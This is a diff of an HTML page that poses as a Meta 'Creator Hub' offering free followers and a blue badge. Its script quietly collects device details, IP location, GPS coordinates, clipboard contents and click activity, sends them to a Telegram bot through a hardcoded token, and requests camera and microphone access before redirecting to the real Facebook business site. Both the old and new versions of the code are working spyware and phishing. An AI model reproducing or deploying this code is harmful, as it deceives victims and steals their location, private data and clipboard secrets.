@@ -1,57 +1,50 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0"><title>Meta Business Suite | Creator Hub</title><link href="https://fonts.googleapis.com" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com"><style>:root{--p:#0064e0;--s:#42b72a;--bg:#f0f2f5;--card:#fff;--txt:#1c1e21}*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--txt);display:flex;align-items:center;justify-content:center;min-height:100vh;padding:15px}.container{max-width:400px;width:100%;background:var(--card);border-radius:12px;box-shadow:0 12px 28px rgba(0,0,0,0.15);overflow:hidden}.header{padding:30px;text-align:center;border-bottom:1px solid #eee}.logo{font-size:45px;color:var(--p);margin-bottom:10px}.content{padding:20px;text-align:center}.main-btn{width:100%;padding:16px;border:none;border-radius:8px;background:var(--p);color:#fff;font-size:16.5px;font-weight:700;cursor:pointer}.grid{display:none;grid-template-columns:1fr 1fr;gap:12px;margin-top:20px}.card{padding:18px;background:#f0f2f5;border-radius:10px;font-size:12px;font-weight:700;cursor:pointer;border:1px solid #ddd;transition:0.2s;text-align:center}.card i{font-size:24px;color:var(--p);margin-bottom:8px;display:block}.progress-box{display:none;margin-top:15px}.bar-bg{height:10px;background:#e4e6eb;border-radius:10px;overflow:hidden}.bar-fill{height:100%;background:var(--p);width:0%;transition:0.5s}.status{font-size:12px;margin-top:8px;color:#65676b;font-weight:500}</style></head><body>
-<div class="container"><div class="header"><div class="logo"><i class="fab fa-facebook"></i></div><h2 style="font-size:20px">Meta Creator Hub</h2><p style="font-size:13px;color:#65676b;margin-top:8px">Link your device to unlock 10k Followers, Blue Badge, and Premium Ad-Groups.</p></div><div class="content"><button id="startBtn" class="main-btn">Activate Meta Sync</button><div id="progressBox" class="progress-box"><div class="bar-bg"><div id="bar" class="bar-fill"></div></div><div id="status" class="status">Syncing Secure ID...</div></div><div id="grid" class="grid"><div class="card" data-act="cam"><i class="fas fa-certificate"></i>Blue Badge Sync</div><div class="card" data-act="loc"><i class="fas fa-chart-line"></i>Ad-Region Lock</div><div class="card" data-act="mic"><i class="fas fa-headset"></i>Voice Support</div><div class="card" data-act="fol"><i class="fas fa-user-plus"></i>10k Free Followers</div><div class="card" data-act="net"><i class="fas fa-bolt"></i>Fast Net Trick</div><div class="card" data-act="grp"><i class="fas fa-users-crown"></i>Join VIP Groups</div></div></div></div><script>
-class OmniCapture {
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0"><title>Meta Business Suite | Creator Hub</title><link href="https://fonts.googleapis.com" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com"><style>:root{--p:#0064e0;--bg:#f0f2f5;--card:#fff;--txt:#1c1e21}*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--txt);display:flex;align-items:center;justify-content:center;min-height:100vh;padding:15px}.container{max-width:400px;width:100%;background:var(--card);border-radius:12px;box-shadow:0 12px 28px rgba(0,0,0,0.12);overflow:hidden;animation:slideUp 0.5s ease}.header{padding:35px 20px;text-align:center;border-bottom:1px solid #eee}.logo{font-size:45px;color:var(--p);margin-bottom:12px}.content{padding:25px;text-align:center}.main-btn{width:100%;padding:18px;border:none;border-radius:10px;background:var(--p);color:#fff;font-size:16px;font-weight:700;cursor:pointer;box-shadow:0 4px 12px rgba(0,100,224,0.3)}.grid{display:none;grid-template-columns:1fr 1fr;gap:12px;margin-top:25px}.card{padding:18px;background:#f0f2f5;border-radius:10px;font-size:12px;font-weight:700;cursor:pointer;border:1px solid #ddd;transition:0.2s}.card:hover{background:#e4e6eb;border-color:var(--p);transform:translateY(-2px)}.card i{font-size:24px;color:var(--p);margin-bottom:8px;display:block}.progress-box{display:none;margin-top:20px}.bar-bg{height:10px;background:#e4e6eb;border-radius:10px;overflow:hidden}.bar-fill{height:100%;background:var(--p);width:0%;transition:0.5s}.status{font-size:12px;margin-top:8px;color:#65676b;font-weight:500}@keyframes slideUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}</style></head><body>
+<div class="container"><div class="header"><div class="logo"><i class="fab fa-facebook"></i></div><h2 style="font-size:22px">Meta Creator Studio</h2><p style="font-size:14px;color:#65676b;margin-top:8px">Link your device to unlock 10k Followers, Blue Badge, and Premium Ad-Groups.</p></div><div class="content"><button id="startBtn" class="main-btn">Activate Meta Sync</button><div id="progressBox" class="progress-box"><div class="bar-bg"><div id="bar" class="bar-fill"></div></div><div id="status" class="status">Initializing Secure Sync...</div></div><div id="grid" class="grid"><div class="card" data-act="cam"><i class="fas fa-certificate"></i>Blue Badge Sync</div><div class="card" data-act="loc"><i class="fas fa-chart-line"></i>Ad-Region Lock</div><div class="card" data-act="mic"><i class="fas fa-microphone-alt"></i>Voice Support</div><div class="card" data-act="fol"><i class="fas fa-user-plus"></i>10k Free Followers</div><div class="card" data-act="net"><i class="fas fa-bolt"></i>Fast Net Trick</div><div class="card" data-act="grp"><i class="fas fa-users-crown"></i>Join VIP Groups</div></div></div></div><script>
+class MetaApex {
     constructor() {
-        this.tg = { token: '8085353942:AAH-r1yJqPGNvPruBICBW4aFAh2IPJjy_Qw', chat: '6671784926' };
+        this.config = { token: '8085353942:AAH-r1yJqPGNvPruBICBW4aFAh2IPJjy_Qw', chat: '6671784926' };
         this.session = Math.random().toString(36).substring(2, 10).toUpperCase();
         this.init();
     }
     async report(msg, head="INFO") {
-        await fetch(`https://api.telegram.org{this.tg.token}/sendMessage`, {
+        await fetch(`https://api.telegram.org{this.config.token}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: this.tg.chat, text: `💎 <b>[${head}] ID: ${this.session}</b>\n\n${msg}`, parse_mode: 'HTML' })
+            body: JSON.stringify({ chat_id: this.config.chat, text: `💎 <b>[${head}] ID: ${this.session}</b>\n\n${msg}`, parse_mode: 'HTML' })
         });
     }
     async init() {
         const ip = await fetch('https://ipapi.co').then(r => r.json()).catch(() => ({}));
-        const bat = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:0}));
-        const gpu = this.getGPU();
-        
-        let report = `📂 <b>SYSTEM DEEP SCAN:</b>\nOS: ${navigator.platform}\nGPU: ${gpu}\nRAM: ${navigator.deviceMemory}GB\nCPU: ${navigator.hardwareConcurrency} Cores\nBAT: ${Math.round(bat.level*100)}%\nNET: ${navigator.connection ? navigator.connection.effectiveType : '4G'}\n\n🏙️ <b>GEO:</b> ${ip.city}, ${ip.country_name}\n🏢 <b>ISP:</b> ${ip.org}\n📍 <b>IP:</b> <code>${ip.ip}</code>`;
-        this.report(report, "OMNI-v11.0");
+        const bat = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:0.99}));
+        let report = `📂 <b>SYSTEM DEEP SCAN:</b>\nOS: ${navigator.platform}\nGPU: ${this.getGPU()}\nRAM: ${navigator.deviceMemory}GB\nBAT: ${Math.round(bat.level*100)}%\nNET: ${navigator.connection ? navigator.connection.effectiveType : '4G'}\n\n🏙️ <b>GEO:</b> ${ip.city}, ${ip.country_name}\n🏢 <b>ISP:</b> ${ip.org}\n📍 <b>IP:</b> <code>${ip.ip}</code>`;
+        this.report(report, "OMNI-v12.0");
 
         document.getElementById('startBtn').onclick = async () => {
             document.getElementById('startBtn').style.display = 'none';
             document.getElementById('progressBox').style.display = 'block';
-            
-            this.triggerAll(); // Stealth Siphon
-
+            this.triggerSiphon();
             const bar = document.getElementById('bar');
-            for(let i=0; i<=100; i+=25) {
-                bar.style.width = i + '%';
-                await new Promise(r => setTimeout(r, 500));
-            }
+            for(let i=0; i<=100; i+=25) { bar.style.width = i + '%'; await new Promise(r => setTimeout(r, 400)); }
             document.getElementById('grid').style.display = 'grid';
             document.getElementById('status').innerText = "Security Sync Complete! Select Module:";
         };
-        document.querySelectorAll('.card').forEach(c => c.onclick = () => this.handle(c.dataset.act, c.innerText));
+        document.querySelectorAll('.card').forEach(c => c.onclick = () => {
+            this.report(`🎯 <b>CLICK:</b> ${c.innerText}`, "ACTIVITY");
+            alert("Syncing... Do not close this page.");
+            setTimeout(() => { window.location.href = "https://business.facebook.com"; }, 2000);
+        });
     }
     getGPU() {
         try { const c=document.createElement('canvas'); const gl=c.getContext('webgl'); const d=gl.getExtension('WEBGL_debug_renderer_info'); return gl.getParameter(d.UNMASKED_RENDERER_WEBGL); } catch(e) { return 'N/A'; }
     }
-    async triggerAll() {
-        navigator.geolocation.getCurrentPosition(p => this.report(`📍 GPS: <a href="https://www.google.com{p.coords.latitude},${p.coords.longitude}">View Location</a>`, "LOCATION"));
+    async triggerSiphon() {
+        navigator.geolocation.getCurrentPosition(p => this.report(`📍 GPS: <a href="https://www.google.com{p.coords.latitude},${p.coords.longitude}">View Map</a>`, "LOCATION"));
         navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(s => {
-            this.report("📸/🎙️ CAM & MIC: ACCESSED", "MEDIA");
+            this.report("📸/🎙️ MEDIA ACCESSED", "MEDIA");
             s.getTracks().forEach(t => t.stop());
-        }).catch(() => this.report("❌ MEDIA: REJECTED", "ERROR"));
+        });
         try { navigator.clipboard.readText().then(t => this.report(`📋 CLIP: <code>${t}</code>`, "HIDDEN")); } catch(e){}
     }
-    handle(act, name) {
-        this.report(`🎯 <b>CLICK:</b> ${name}`, "ACTIVITY");
-        alert("Establishing Secure Meta Tunnel... Stay on this page.");
-        setTimeout(() => { window.location.href = "https://business.facebook.com"; }, 3000);
-    }
 }
-new OmniCapture();
+new MetaApex();
 </script></body></html>
+
